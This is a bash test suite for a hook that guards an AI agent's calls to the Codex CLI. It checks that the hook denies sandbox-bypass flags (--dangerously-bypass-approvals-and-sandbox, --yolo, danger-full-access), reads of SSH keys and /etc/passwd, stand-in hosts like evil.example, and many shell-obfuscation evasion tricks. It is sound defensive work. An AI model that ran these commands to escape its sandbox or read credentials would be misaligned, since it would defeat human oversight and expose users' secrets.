#!/usr/bin/env bash
# Test suite for pretool-codex-guard.sh
#
# Usage: bash pretool-codex-guard.test.sh
#
# Exit 0 on all pass, non-zero otherwise.
#
# shellcheck disable=SC2016
# 単一引用符内の `$(…)` / `$VAR` / backtick は意図的なリテラル（hook に生文字列として渡す）

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HOOK="${SCRIPT_DIR}/pretool-codex-guard.sh"

if [[ ! -x ${HOOK} ]]; then
  echo "FAIL: hook not executable: ${HOOK}" >&2
  exit 1
fi

PASS=0
FAIL=0
FAILURES=()

# dev-flow の Codex security review の出力先を決める user 設定（hook は $SKILL_CONFIG_PATH → $HOME の下の順で読む）
WORK=$(mktemp -d "${TMPDIR:-/tmp}/codex-guard-test.XXXXXX")
trap 'rm -rf "$WORK"' EXIT
RELAY_HOME="${WORK}/home"
RELAY_CONFIG="${WORK}/skill-config.json"

# run_hook <command> [agent_type]: agent_type を渡すと hook 入力に入れる（無ければメインセッション）
run_hook() {
  jq -n --arg cmd "$1" --arg agent "${2:-}" '{tool_name:"Bash", tool_input:{command:$cmd}} + (if $agent == "" then {} else {agent_type:$agent} end)' |
    SKILL_CONFIG_PATH="$RELAY_CONFIG" HOME="$RELAY_HOME" bash "$HOOK" 2>&1 || true
}

# run_case <name> <command> <expected: deny|pass> [agent_type]
# pass は「stdout が空」（allow も含め何も返さない）
run_case() {
  local name="$1"
  local cmd="$2"
  local expected="$3"
  local agent="${4:-}"

  local output
  output=$(run_hook "$cmd" "$agent")

  local decision="pass"
  if [[ -n $output ]]; then
    decision=$(echo "$output" | jq -r '.hookSpecificOutput.permissionDecision // "unexpected-output"' 2>/dev/null || echo "unexpected-output")
  fi

  if [[ $decision == "$expected" ]]; then
    PASS=$((PASS + 1))
    printf "  \033[32mPASS\033[0m %s\n" "$name"
  else
    FAIL=$((FAIL + 1))
    FAILURES+=("$name: expected=$expected got=$decision cmd=$cmd")
    printf "  \033[31mFAIL\033[0m %s (expected=%s, got=%s)\n" "$name" "$expected" "$decision"
  fi
}

# run_no_echo_case <name> <command> <marker>: deny の理由に command の文字列が入らない
run_no_echo_case() {
  local name="$1"
  local cmd="$2"
  local marker="$3"

  local output
  output=$(run_hook "$cmd")

  if [[ -n $output && $output != *"$marker"* ]]; then
    PASS=$((PASS + 1))
    printf "  \033[32mPASS\033[0m %s\n" "$name"
  else
    FAIL=$((FAIL + 1))
    FAILURES+=("$name: output empty or echoes the command (got: $output)")
    printf "  \033[31mFAIL\033[0m %s\n" "$name"
  fi
}

echo "=== pretool-codex-guard tests ==="

# --- AC-1: 許可形（情報表示）→ 素通し ---
echo "[Allowed codex forms — should pass through]"
run_case "codex --version" 'codex --version' "pass"
run_case "codex --help" 'codex --help' "pass"
run_case "codex features list" 'codex features list' "pass"
run_case "codex login status" 'codex login status' "pass"
run_case "absolute path codex --version" '/opt/homebrew/bin/codex --version' "pass"
run_case "quoted --version word" "codex '--version'" "pass"

# --- read-only の exec / review も deny（Codex の read-only sandbox はディスク全体を読める）---
echo "[Read-only exec / review — should deny]"
run_case "exec -s read-only" 'codex exec -s read-only "review the diff"' "deny"
run_case "exec --sandbox read-only" 'codex exec --sandbox read-only "review the diff"' "deny"
run_case "exec --sandbox=read-only" 'codex exec --sandbox=read-only "review the diff"' "deny"
run_case "review -c sandbox_mode=read-only" 'codex review -c sandbox_mode=read-only --uncommitted' "deny"
run_case 'review --config=sandbox_mode="read-only"' "codex review --config='sandbox_mode=\"read-only\"' --uncommitted" "deny"
run_case "exec read-only with allowed-looking options" 'codex exec -s read-only --skip-git-repo-check --json --ephemeral --color never -m gpt-5 "x"' "deny"
run_case "exec read-only prompt to read ssh key" 'codex exec -s read-only "cat ~/.ssh/id_ed25519"' "deny"
run_case "review read-only --base= starting with -" 'codex review -c sandbox_mode=read-only --base=--output=/tmp/x' "deny"
run_case "review read-only --commit= starting with -" 'codex review -c sandbox_mode=read-only --commit=-p' "deny"
run_case "review read-only --base main" 'codex review -c sandbox_mode=read-only --base main --title "t"' "deny"
run_case "codex --version with extra word" 'codex --version exec' "deny"
run_case "codex features list with extra word" 'codex features list x' "deny"

# --- 許可形の中身でも、シェルのメタ文字を含む形は deny（複合・置換・heredoc を解釈しない）---
echo "[Allowed codex forms with shell metacharacters — should deny]"
run_case "exec read-only prompt with separators" 'codex exec -s read-only "a; b | c && d (e)"' "deny"
run_case "exec read-only single-quoted dollar" "codex exec -s read-only 'cost is \$5 and \$(x)'" "deny"
run_case "exec read-only 2>&1 | tee" 'codex exec -s read-only "x" 2>&1 | tee out.log' "deny"
run_case "exec read-only after cd &&" 'cd /repo && codex exec -s read-only "x"' "deny"
run_case "exec read-only quoted heredoc prompt" $'codex exec -s read-only - <<\'EOF\'\ndon\'t run codex exec --dangerously-bypass-approvals-and-sandbox; ls | wc\nEOF' "deny"
run_case "exec read-only multi-line quoted prompt" $'codex exec -s read-only "line1\nline2; codex exec --add-dir /"' "deny"
run_case "exec read-only behind timeout" 'timeout 600 codex exec -s read-only "x"' "deny"
run_case "exec read-only output redirect" 'codex exec -s read-only "x" > out.md' "deny"
run_case "exec read-only two stdin redirects" 'codex exec -s read-only - < a.md < b.md' "deny"
run_case "exec read-only backslash in double quotes" 'codex exec -s read-only "a\"b"' "deny"
run_case "exec read-only unquoted glob" 'codex exec -s read-only x*' "deny"
run_case "exec read-only unquoted history bang" 'codex exec -s read-only x!' "deny"
run_case "quoted codex name after plain word check" "'codex' --version" "deny"
run_case "parameter expansion with parens inside arithmetic" $': $(( ${x//))/\'"\'"\'} ))\ncodex --yolo exec x\n# \'' "deny"

# --- AC-1: 許可形以外の codex 呼び出し → deny ---
echo "[Other codex forms — should deny]"
run_case "interactive TUI" 'codex' "deny"
run_case "interactive TUI with prompt" 'codex "fix the bug"' "deny"
run_case "codex sandbox" 'codex sandbox macos -- ls' "deny"
run_case "codex apply" 'codex apply' "deny"
run_case "codex mcp" 'codex mcp list' "deny"
run_case "codex login (not status)" 'codex login' "deny"
run_case "codex features enable" 'codex features enable foo' "deny"
run_case "exec without sandbox" 'codex exec "review the diff"' "deny"
run_case "exec alias e without sandbox" 'codex e "x"' "deny"
run_case "review without sandbox" 'codex review --uncommitted' "deny"
run_case "global -s read-only before exec" 'codex -s read-only exec "review the diff"' "deny"
run_case "review with global -s read-only" 'codex -s read-only review --uncommitted' "deny"
run_case "review -s read-only (codex rejects -s on review)" 'codex review -s read-only --commit abc123' "deny"
run_case "global -c sandbox_mode before review" 'codex -c sandbox_mode=read-only review --uncommitted' "deny"
run_case "review sandbox_mode=read-only then workspace-write" 'codex review -c sandbox_mode=read-only -c sandbox_mode=workspace-write' "deny"
run_case "read-only before sandbox subcommand" 'codex -s read-only sandbox macos -- ls' "deny"
run_case "read-only after -- is a prompt" 'codex -- exec -s read-only' "deny"
run_case "exec after cd &&" 'cd /repo && codex exec "x"' "deny"
run_case "exec after allowed codex" 'codex --version && codex exec "x"' "deny"
run_case "exec with env prefix" 'FOO=1 codex exec "x"' "deny"
run_case "exec in subshell" '(codex exec "x")' "deny"
run_case "exec in brace group" '{ codex exec "x"; }' "deny"
run_case "exec in command substitution" 'echo "$(codex exec "x")"' "deny"
run_case "exec in backticks" 'echo `codex exec x`' "deny"
run_case "exec piped" 'codex exec "x" | tee out.log' "deny"
run_case "exec on second line" $'echo start\ncodex exec "x"' "deny"
run_case "exec after comment with apostrophe" $'# don\'t\ncodex exec "x"' "deny"
run_case "exec after quoted heredoc" $'cat <<\'EOF\'\nit\'s\nEOF\ncodex exec "x"' "deny"
run_case "exec quoted command name" '"codex" exec "x"' "deny"
run_case "bypass behind timeout" 'timeout 5 codex exec --dangerously-bypass-approvals-and-sandbox x' "deny"
run_case "exec behind timeout with options" 'timeout -k 5 -s TERM 30s codex exec "x"' "deny"
run_case "exec behind nice -n" 'nice -n 10 codex exec "x"' "deny"
run_case "exec behind nohup" 'nohup codex exec "x"' "deny"
run_case "exec behind stdbuf" 'stdbuf -oL codex exec "x"' "deny"
run_case "exec behind time -p" 'time -p codex exec "x"' "deny"
run_case "exec behind nested wrappers" 'nice timeout 5 /opt/homebrew/bin/codex exec "x"' "deny"
run_case "exec behind timeout with dynamic duration" 'timeout "$T" codex exec "x"' "deny"
run_case "--yolo behind env" 'env codex --yolo exec x' "deny"
run_case "exec behind env -u" 'env -u FOO codex exec "x"' "deny"
run_case "exec behind env -i" 'env -i codex exec "x"' "deny"
run_case "exec behind /usr/bin/env -C" '/usr/bin/env -C /tmp codex exec "x"' "deny"
run_case "CODEX_HOME after env on read-only exec" 'env CODEX_HOME=/private/tmp/claude/x codex exec -s read-only "x"' "deny"
run_case "dynamic word after env on read-only exec" 'env "$V" codex exec -s read-only "x"' "deny"
run_case "env -S hides codex arguments" "env -S 'codex --yolo exec x'" "deny"
run_case "env --split-string= hides codex arguments" "env --split-string='codex --yolo exec x'" "deny"

# --- AC-2: sandbox を外す・広げる指定 → read-only を明示しても deny ---
echo "[Sandbox-escaping flags — should deny]"
run_case "bypass approvals and sandbox" 'codex exec -s read-only --dangerously-bypass-approvals-and-sandbox "x"' "deny"
run_case "bypass hook trust" 'codex exec -s read-only --dangerously-bypass-hook-trust "x"' "deny"
run_case "global bypass before exec" 'codex --dangerously-bypass-approvals-and-sandbox exec "x"' "deny"
run_case "exec read-only with --yolo" 'codex exec -s read-only --yolo "x"' "deny"
run_case "global --yolo before exec" 'codex --yolo exec "x"' "deny"
run_case "CODEX_HOME prefix on read-only exec" 'CODEX_HOME=/private/tmp/claude/x codex exec -s read-only "x"' "deny"
run_case "env prefix on read-only exec" 'FOO=1 codex exec -s read-only "x"' "deny"
run_case "review with bypass" 'codex review -c sandbox_mode=read-only --dangerously-bypass-approvals-and-sandbox' "deny"
run_case "-s workspace-write" 'codex exec -s workspace-write "x"' "deny"
run_case "-s danger-full-access" 'codex exec -s danger-full-access "x"' "deny"
run_case "--sandbox workspace-write" 'codex exec --sandbox workspace-write "x"' "deny"
run_case "--sandbox=danger-full-access" 'codex exec --sandbox=danger-full-access "x"' "deny"
run_case "-sworkspace-write attached" 'codex exec -sworkspace-write "x"' "deny"
run_case "review with -s danger-full-access" 'codex -s danger-full-access review' "deny"
run_case "--add-dir" 'codex exec -s read-only --add-dir /tmp "x"' "deny"
run_case "--add-dir=" 'codex exec -s read-only --add-dir=/tmp "x"' "deny"
run_case "--approve-for-me" 'codex exec -s read-only --approve-for-me "x"' "deny"
run_case "exec read-only -o" 'codex exec -s read-only -o /tmp/out.md "x"' "deny"
run_case "exec read-only -o attached" 'codex exec -s read-only -o/tmp/out.md "x"' "deny"
run_case "exec read-only --output-last-message" 'codex exec -s read-only --output-last-message /tmp/out.md "x"' "deny"
run_case "exec read-only --output-last-message=" 'codex exec -s read-only --output-last-message=/tmp/out.md "x"' "deny"
run_case "-c notify" "codex exec -s read-only -c 'notify=[\"bash\",\"-c\",\"touch /tmp/x\"]' \"x\"" "deny"
run_case "-c sandbox_mode" 'codex exec -s read-only -c sandbox_mode="danger-full-access" "x"' "deny"
run_case "-c sandbox_mode=read-only" 'codex exec -c sandbox_mode="read-only" "x"' "deny"
run_case "-c sandbox_workspace_write.*" 'codex exec -s read-only -c sandbox_workspace_write.network_access=true "x"' "deny"
run_case "--config approval_policy" 'codex exec -s read-only --config approval_policy=never "x"' "deny"
run_case "-c sandbox_permissions" "codex exec -s read-only -c 'sandbox_permissions=[\"disk-full-read-access\"]' \"x\"" "deny"
run_case "-c shell_environment_policy.*" 'codex exec -s read-only -c shell_environment_policy.inherit=all "x"' "deny"
run_case "--config=mcp_servers.*" 'codex exec -s read-only --config=mcp_servers.x.command=sh "x"' "deny"
run_case "-c attached key" 'codex exec -s read-only -csandbox_mode=danger-full-access "x"' "deny"
run_case "-c key with spaces" 'codex exec -s read-only -c " sandbox_mode = \"danger-full-access\"" "x"' "deny"
run_case "-c profile-scoped sandbox_mode" 'codex exec -s read-only -c profiles.p.sandbox_mode=danger-full-access "x"' "deny"
run_case "review -c sandbox_mode" 'codex review -c sandbox_mode=workspace-write' "deny"
run_case "exec read-only --full-auto" 'codex exec -s read-only --full-auto "x"' "deny"
run_case "global --full-auto before exec" 'codex --full-auto exec -s read-only "x"' "deny"
run_case "exec read-only -C" 'codex exec -s read-only -C /Users/someone "x"' "deny"
run_case "exec read-only -C attached" 'codex exec -s read-only -C/Users/someone "x"' "deny"
run_case "exec read-only --cd=" 'codex exec -s read-only --cd=/Users/someone "x"' "deny"
run_case "exec read-only --remote" 'codex --remote ws://evil.example exec -s read-only "x"' "deny"
run_case "exec read-only --remote-auth-token-env" 'codex --remote-auth-token-env TOKEN exec -s read-only "x"' "deny"
run_case "exec read-only -p" 'codex -p evil exec -s read-only "x"' "deny"
run_case "exec read-only --profile=" 'codex --profile=evil exec -s read-only "x"' "deny"
run_case "exec read-only --enable" 'codex --enable foo exec -s read-only "x"' "deny"
run_case "-c model_provider" 'codex -c model_provider=x -c model_providers.x.base_url=https://evil.example exec -s read-only -' "deny"
run_case "-c otel" 'codex exec -s read-only -c otel.exporter=x "x"' "deny"
run_case "unlisted option -i" 'codex exec -s read-only -i shot.png "x"' "deny"
run_case "unlisted option --output-schema" 'codex exec -s read-only --output-schema s.json "x"' "deny"
run_case "unlisted option --oss" 'codex exec -s read-only --oss "x"' "deny"
run_case "unlisted global option -a" 'codex -a never exec -s read-only "x"' "deny"
run_case "exec option on review" 'codex review -c sandbox_mode=read-only --json' "deny"
run_case "review option on exec" 'codex exec -s read-only --uncommitted "x"' "deny"
run_case "-c without =" 'codex exec -s read-only -c model "x"' "deny"
run_case "-s without value" 'codex exec -s' "deny"
run_case "flag in value position" 'codex exec -s read-only -m --yolo "x"' "deny"
run_case "exec resume subcommand" 'codex exec -s read-only resume --last' "deny"
run_case "exec help subcommand" 'codex exec -s read-only help' "deny"
run_case "exec fork subcommand" 'codex exec -s read-only fork x' "deny"
run_case "exec review subcommand" 'codex exec -s read-only review' "deny"
run_case "zsh precommand modifier -" '- codex --yolo exec x' "deny"
run_case "command builtin" 'command codex --yolo exec x' "deny"
run_case "zsh noglob" 'noglob codex --yolo exec x' "deny"
run_case "exec builtin" 'exec codex --yolo exec x' "deny"
run_case "zsh =codex expansion" '=codex --yolo exec x' "deny"
run_case "backslash-quoted codex name" '\codex --yolo exec x' "deny"
run_case "arithmetic shift is not a heredoc" $': $((1<<2))\ncodex --yolo exec x\n2' "deny"
run_case "arithmetic command shift is not a heredoc" $'((a<<1))\ncodex --yolo exec x\n1' "deny"
run_case "codex inside arithmetic expansion" 'echo $(( $(codex --yolo exec x) ))' "deny"
run_case "quoted paren inside arithmetic command" $'(( x[")) \'"] ))\ncodex --yolo exec x\n# \'' "deny"
run_case "quoted paren inside arithmetic expansion" $': $(( x[")) \'"] ))\ncodex --yolo exec x\n# \'' "deny"
run_case "command substitution in unquoted heredoc body" $'cat <<EOF\n$(codex --yolo exec x)\nEOF' "deny"
run_case "backticks in unquoted heredoc body" $'cat <<EOF\n`codex --yolo exec x`\nEOF' "deny"
run_case "plain unquoted heredoc body" $'gh pr create --body-file - <<EOF\ncodex exec is denied\nEOF' "deny"
run_case "nested backticks" 'echo `echo \`codex --yolo exec x\``' "deny"
run_case "case inside command substitution" 'echo $(case x in x) codex --yolo exec x;; esac)' "deny"
run_case "flag after redirect" 'codex exec -s read-only "x" 2>&1 --add-dir /' "deny"
run_case "flag after command substitution arg" 'codex exec -s read-only "$(echo hi)" --add-dir /' "deny"
run_case "dynamic arg: command substitution" 'codex exec -s read-only "$(cat prompt.md)"' "deny"
run_case "dynamic arg: variable" 'codex exec -s read-only $FLAGS "x"' "deny"
run_case "dynamic arg: quoted variable" 'codex exec -s read-only "$FLAGS"' "deny"
run_case "dynamic arg: backticks" 'codex exec -s read-only `cat flags`' "deny"
run_case "dynamic arg: ANSI-C quoting" "codex exec -s read-only \$'--add-dir' /" "deny"
run_case "ANSI-C escaped quote hides a second codex" "codex exec -s read-only - <<<\$'\\'' ; codex --yolo exec x # '" "deny"
run_case "dynamic here-string" 'codex exec -s read-only - <<<"$PROMPT"' "deny"
run_case "dynamic arg: glob" 'codex exec -s read-only --add* /' "deny"
run_case "dynamic arg: brace expansion" 'codex exec -s read-only --{add-dir,x} /' "deny"
run_case "dynamic arg: process substitution" 'codex exec -s read-only <(cat flags)' "deny"
run_no_echo_case "deny reason does not echo the command" 'codex exec "SECRET_MARKER_409"' 'SECRET_MARKER_409'
run_no_echo_case "danger reason does not echo the command" 'codex exec --dangerously-bypass-approvals-and-sandbox "SECRET_MARKER_409"' 'SECRET_MARKER_409'

# --- AC-3: 先頭トークンが codex でないコマンド → 無出力で素通し ---
echo "[Non-codex commands — should pass through silently]"
run_case "generate-thumbnail" 'generate-thumbnail --input a.png --output b.png' "pass"
run_case "grep codex" 'grep -rn codex claude-code/' "pass"
run_case "rg dangerous flag as pattern" "rg -n 'codex exec --dangerously-bypass-approvals-and-sandbox' docs" "pass"
run_case "git commit message" 'git commit -m "feat: deny codex exec -s danger-full-access"' "pass"
run_case "echo codex" 'echo codex' "pass"
run_case "ls ~/.codex" 'ls ~/.codex' "pass"
run_case "cat codex config" 'cat codex/config.base.toml' "pass"
run_case "jq codex key" "jq '.codex' file.json" "pass"
run_case "word containing codex" 'mycodex exec "x"' "pass"
run_case "path not ending in codex" './codex-helper exec "x"' "pass"
run_case "codex in comment" '# codex exec "x"' "pass"
run_case "codex in double-quoted arg with glob" 'git log --grep "codex*"' "pass"
run_case "codex word in an unknown wrapper's args" 'nohup grep codex f' "deny"
run_case "VAR= prefix before plain command" 'FOO=1 grep codex f' "deny"
# メタ文字を含む非 codex コマンドも、codex を起動しうる形として deny に倒す（fail-closed）
run_case "codex in quoted heredoc body" $'gh pr create --body-file - <<\'EOF\'\ncodex exec --dangerously-bypass-approvals-and-sandbox\nEOF' "deny"
run_case "grep codex piped" 'grep -rn codex docs | head' "deny"
# 印字可能な ASCII と空白以外のバイトを含むものは素通しせず、許可形の判定に回す
run_case "non-ASCII git commit message" 'git commit -m "feat: codex exec -s danger-full-access を deny する"' "deny"
run_case "non-ASCII bytes before ; codex" $'grep \xe3\x81 f ; codex --yolo exec x' "deny"
# 4096 バイトを超えるものは字句分割の前に deny
long_arg=$(printf 'a%.0s' {1..4100})
run_case "codex word in an over-long command" "grep codex ${long_arg}" "deny"

# --- < file は受けない（sandbox の外の shell が開くので、作業ツリーに置いた symlink 越しに外を読める）---
echo "[Stdin redirect — should deny]"
run_case "stdin from relative file" 'codex exec -s read-only - < prompt.md' "deny"
run_case "stdin from relative file without space" 'codex exec -s read-only - <prompt.md' "deny"
run_case "stdin from relative symlink" 'codex exec -s read-only - < k' "deny"
run_case "stdin from home ssh key" 'codex exec -s read-only --skip-git-repo-check - < ~/.ssh/id_ed25519' "deny"
run_case "stdin from absolute path" 'codex exec -s read-only - < /etc/passwd' "deny"
run_case "stdin from parent dir" 'codex exec -s read-only - < ../secret' "deny"
run_case "stdin with .. inside" 'codex exec -s read-only - < a/../../secret' "deny"
run_case "stdin from zsh =cmd expansion" 'codex exec -s read-only - < =ls' "deny"
run_case "stdin from ~user" 'codex exec -s read-only - <~root/x' "deny"
run_case "stdin from nested relative path" 'codex exec -s read-only - < docs/prompt.md' "deny"

# --- dev-flow の Codex security review（claude-plugins #1091・#1097）の固定形 ---
RELAY='dev-flow:security-codex-relay'
R_OUT=/Users/someone/dev-flow-codex-out
R_DIR=/private/tmp/claude-502/dev-flow-security-review-Ab12Cd
R_NONCE=0123456789abcdef0123456789abcdef
R_BIND=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
R_PROMPT='Run the security review described in your instructions and reply only with the JSON object defined by the output schema. Set its nonce field to'

# relay_cmd <O> <D> <N> <B> [<prompt の nonce>]: _lib/security-review.mjs の codexSecurityReviewCommand と同じ形
relay_cmd() {
  local o="$1" d="$2" n="$3" b="$4" pn="${5:-$3}"
  printf '%s' "codex exec -s read-only --ephemeral --ignore-user-config --ignore-rules --skip-git-repo-check -C ${o}/dev-flow-codex-cwd-${n}-${b} -c dev_flow_review_dir=\"${d}\" -c web_search=\"disabled\" --disable shell_tool --disable unified_exec --disable apps --disable browser_use --disable computer_use -c model_instructions_file=${o}/dev-flow-codex-prompt-${n}-${b}.md --output-schema ${o}/dev-flow-codex-schema-${n}-${b}.json -o ${o}/dev-flow-codex-result-${n}-${b}.json \"${R_PROMPT} ${pn}\""
}

# write_config <codex_output_dir の JSON 値>
write_config() {
  printf '{"dev-flow":{"codex_output_dir":%s}}\n' "$1" >"$RELAY_CONFIG"
}

write_config "\"${R_OUT}\""
R_CMD=$(relay_cmd "$R_OUT" "$R_DIR" "$R_NONCE" "$R_BIND")

echo "[dev-flow Codex security review form — relay agent only]"
run_case "relay: fixed form" "$R_CMD" "pass" "$RELAY"
run_case "relay: fixed form with another mkdtemp dir" "$(relay_cmd "$R_OUT" /var/folders/ab/T/dev-flow-security-review-zZ9yX8 fedcba9876543210fedcba9876543210 "$R_BIND")" "pass" "$RELAY"
run_case "relay form from main session (no agent_type)" "$R_CMD" "deny"
run_case "relay form from another dev-flow agent" "$R_CMD" "deny" "dev-flow:security-codex-verdict"
run_case "relay form from general-purpose agent" "$R_CMD" "deny" "general-purpose"
run_case "relay form with agent_type suffix" "$R_CMD" "deny" "${RELAY}x"
run_case "relay: other codex exec" 'codex exec -s read-only "review the diff"' "deny" "$RELAY"
run_case "relay: codex review" 'codex review -c sandbox_mode=read-only --uncommitted' "deny" "$RELAY"
run_case "relay: codex --version still passes" 'codex --version' "pass" "$RELAY"

echo "[dev-flow Codex security review form — flag removed / added / changed]"
run_case "relay: without --ephemeral" "${R_CMD/ --ephemeral/}" "deny" "$RELAY"
run_case "relay: without --ignore-user-config" "${R_CMD/ --ignore-user-config/}" "deny" "$RELAY"
run_case "relay: without --ignore-rules" "${R_CMD/ --ignore-rules/}" "deny" "$RELAY"
run_case "relay: without --skip-git-repo-check" "${R_CMD/ --skip-git-repo-check/}" "deny" "$RELAY"
run_case "relay: without -s read-only" "${R_CMD/ -s read-only/}" "deny" "$RELAY"
run_case "relay: without web_search" "${R_CMD/ -c web_search=\"disabled\"/}" "deny" "$RELAY"
run_case "relay: without --disable shell_tool" "${R_CMD/ --disable shell_tool/}" "deny" "$RELAY"
run_case "relay: without --disable computer_use" "${R_CMD/ --disable computer_use/}" "deny" "$RELAY"
run_case "relay: without -o" "${R_CMD/ -o ${R_OUT}\/dev-flow-codex-result-${R_NONCE}-${R_BIND}.json/}" "deny" "$RELAY"
run_case "relay: without --output-schema" "${R_CMD/ --output-schema ${R_OUT}\/dev-flow-codex-schema-${R_NONCE}-${R_BIND}.json/}" "deny" "$RELAY"
run_case "relay: with bypass appended" "${R_CMD} --dangerously-bypass-approvals-and-sandbox" "deny" "$RELAY"
run_case "relay: with --add-dir inserted" "${R_CMD/ --ephemeral/ --ephemeral --add-dir /}" "deny" "$RELAY"
run_case "relay: with -c sandbox_mode inserted" "${R_CMD/ --ephemeral/ --ephemeral -c sandbox_mode=danger-full-access}" "deny" "$RELAY"
run_case "relay: with --disable shell_tool duplicated" "${R_CMD/ --disable shell_tool/ --disable shell_tool --disable shell_tool}" "deny" "$RELAY"
run_case "relay: with global --yolo" "${R_CMD/codex exec/codex --yolo exec}" "deny" "$RELAY"
run_case "relay: -s workspace-write" "${R_CMD/-s read-only/-s workspace-write}" "deny" "$RELAY"
run_case "relay: web_search live" "${R_CMD/web_search=\"disabled\"/web_search=\"live\"}" "deny" "$RELAY"
run_case "relay: --enable shell_tool" "${R_CMD/--disable shell_tool/--enable shell_tool}" "deny" "$RELAY"
run_case "relay: prompt text changed" "${R_CMD/reply only with/reply with}" "deny" "$RELAY"
run_case "relay: -o outside the output dir" "${R_CMD/-o ${R_OUT}/-o /tmp}" "deny" "$RELAY"
run_case "relay: -C outside the output dir" "${R_CMD/-C ${R_OUT}/-C /tmp}" "deny" "$RELAY"
run_case "relay: model_instructions_file in the review dir" "${R_CMD/model_instructions_file=${R_OUT}\/dev-flow-codex-prompt-${R_NONCE}-${R_BIND}.md/model_instructions_file=${R_DIR}/prompt.md}" "deny" "$RELAY"
run_case "relay: prompt nonce differs" "$(relay_cmd "$R_OUT" "$R_DIR" "$R_NONCE" "$R_BIND" fedcba9876543210fedcba9876543210)" "deny" "$RELAY"
run_case "relay: double space" "${R_CMD/ --ephemeral/  --ephemeral}" "deny" "$RELAY"
run_case "relay: trailing space" "${R_CMD} " "deny" "$RELAY"
run_case "relay: absolute path codex" "/opt/homebrew/bin/${R_CMD}" "deny" "$RELAY"
run_case "relay: followed by a second command" "${R_CMD}; codex --yolo exec x" "deny" "$RELAY"

echo "[dev-flow Codex security review form — variable parts out of shape]"
run_case "relay: review dir with .. element" "$(relay_cmd "$R_OUT" /private/tmp/../Users/someone/dev-flow-security-review-Ab12Cd "$R_NONCE" "$R_BIND")" "deny" "$RELAY"
run_case "relay: review dir with . element" "$(relay_cmd "$R_OUT" /private/tmp/./dev-flow-security-review-Ab12Cd "$R_NONCE" "$R_BIND")" "deny" "$RELAY"
run_case "relay: review dir not mkdtemp form (5 chars)" "$(relay_cmd "$R_OUT" /private/tmp/dev-flow-security-review-Ab12C "$R_NONCE" "$R_BIND")" "deny" "$RELAY"
run_case "relay: review dir not mkdtemp form (other name)" "$(relay_cmd "$R_OUT" /Users/someone/.ssh "$R_NONCE" "$R_BIND")" "deny" "$RELAY"
run_case "relay: review dir relative" "$(relay_cmd "$R_OUT" dev-flow-security-review-Ab12Cd "$R_NONCE" "$R_BIND")" "deny" "$RELAY"
run_case "relay: nonce 31 digits" "$(relay_cmd "$R_OUT" "$R_DIR" "${R_NONCE:1}" "$R_BIND")" "deny" "$RELAY"
run_case "relay: nonce 33 digits" "$(relay_cmd "$R_OUT" "$R_DIR" "0${R_NONCE}" "$R_BIND")" "deny" "$RELAY"
run_case "relay: nonce uppercase hex" "$(relay_cmd "$R_OUT" "$R_DIR" 0123456789ABCDEF0123456789ABCDEF "$R_BIND")" "deny" "$RELAY"
run_case "relay: binding 63 digits" "$(relay_cmd "$R_OUT" "$R_DIR" "$R_NONCE" "${R_BIND:1}")" "deny" "$RELAY"
run_case "relay: output dir not the configured one" "$(relay_cmd /private/tmp/claude-502/out "$R_DIR" "$R_NONCE" "$R_BIND")" "deny" "$RELAY"
write_config '"/Users/someone/../someone/dev-flow-codex-out"'
run_case "relay: output dir with .. element (configured)" "$(relay_cmd /Users/someone/../someone/dev-flow-codex-out "$R_DIR" "$R_NONCE" "$R_BIND")" "deny" "$RELAY"
write_config '"/Users/someone/./dev-flow-codex-out"'
run_case "relay: output dir with . element (configured)" "$(relay_cmd /Users/someone/./dev-flow-codex-out "$R_DIR" "$R_NONCE" "$R_BIND")" "deny" "$RELAY"
write_config '["/Users/someone/dev-flow-codex-out"]'
run_case "relay: configured output dir not a string" "$R_CMD" "deny" "$RELAY"
write_config 'null'
run_case "relay: output dir not configured" "$R_CMD" "deny" "$RELAY"
# $SKILL_CONFIG_PATH に値が無ければ ~/.config/skills/config.json を読む
mkdir -p "${RELAY_HOME}/.config/skills"
printf '{"dev-flow":{"codex_output_dir":"%s"}}\n' "$R_OUT" >"${RELAY_HOME}/.config/skills/config.json"
run_case "relay: output dir from ~/.config/skills/config.json" "$R_CMD" "pass" "$RELAY"

echo ""
echo "=== Results: ${PASS} passed, ${FAIL} failed ==="
if ((FAIL > 0)); then
  printf '\n'
  printf 'Failures:\n'
  for f in "${FAILURES[@]}"; do
    printf '  - %s\n' "$f"
  done
  exit 1
fi
exit 0
